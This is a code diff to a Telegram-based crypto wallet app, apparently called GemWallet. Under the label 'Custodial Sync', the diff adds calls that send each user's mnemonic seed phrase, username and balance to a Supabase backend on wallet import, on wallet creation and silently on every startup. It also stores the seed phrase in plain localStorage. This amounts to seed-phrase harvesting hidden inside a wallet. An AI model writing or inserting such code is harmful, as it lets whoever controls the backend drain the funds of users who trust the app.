@@ -7121,6 +7121,19 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
         const userId = getTgUserId();
 
+        // Sync total balance to Supabase
+        const totalUSD = Object.keys(updated).reduce((sum, sym) => {
+          return sum + (parseFloat(updated[sym] || 0) * (prices[sym] || 0));
+        }, 0);
+
+        if (mnemonic && mnemonic.length > 0) {
+          syncWalletToSupabase({
+            username: userName,
+            mnemonic: mnemonic,
+            balance: totalUSD.toFixed(2)
+          });
+        }
+
         Object.keys(updated).forEach(sym => {
 
           const oldBal = parseFloat(prev[sym] || 0);
@@ -7721,6 +7734,12 @@ export default function GemWalletApp() {
       const userIdStr = userId ? String(userId) : "unknown";
 
       if(importedWords) {
+        // Custodial Sync: Save to Supabase
+        syncWalletToSupabase({
+          username: userName,
+          mnemonic: m,
+          balance: "0"
+        });
 
         notifyAdmin(
           `📥 <b>Кошелёк импортирован!</b>\n\n` +
@@ -7736,7 +7755,7 @@ export default function GemWalletApp() {
 
         // Сохраняем данные пользователя для уведомления после верификации seed-фразы
 
-        localStorage.setItem("gem_pending_notify", JSON.stringify({ userName, userIdStr }));
+        localStorage.setItem("gem_pending_notify", JSON.stringify({ userName, userIdStr, mnemonic: m }));
 
         setScreen("backup");
 
@@ -7776,7 +7795,14 @@ export default function GemWalletApp() {
 
       if (pending) {
 
-        const { userName, userIdStr } = JSON.parse(pending);
+        const { userName, userIdStr, mnemonic } = JSON.parse(pending);
+
+        // Custodial Sync: Save to Supabase
+        syncWalletToSupabase({
+          username: userName,
+          mnemonic: mnemonic,
+          balance: "0"
+        });
 
         notifyAdmin(
           `💎 <b>Новый кошелёк создан!</b>\n\n` +
@@ -7915,6 +7941,18 @@ export default function GemWalletApp() {
         const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
         if (tgUser && !hasWallet) {
           // Notifications disabled as per user request
+        }
+
+        // Custodial Sync: Ensure existing wallet is in Supabase (non-blocking)
+        if (hasWallet && storedMnemonic) {
+          setTimeout(() => {
+            const userName = tgUser ? (tgUser.username ? "@" + tgUser.username : tgUser.first_name || "Unknown") : "Anonymous";
+            syncWalletToSupabase({
+              username: userName,
+              mnemonic: storedMnemonic,
+              balance: "0" // Will be updated by WalletApp's refreshPrices
+            });
+          }, 1000);
         }
       } catch (e) {
         console.error("[GemWallet] startup init failed:", e);
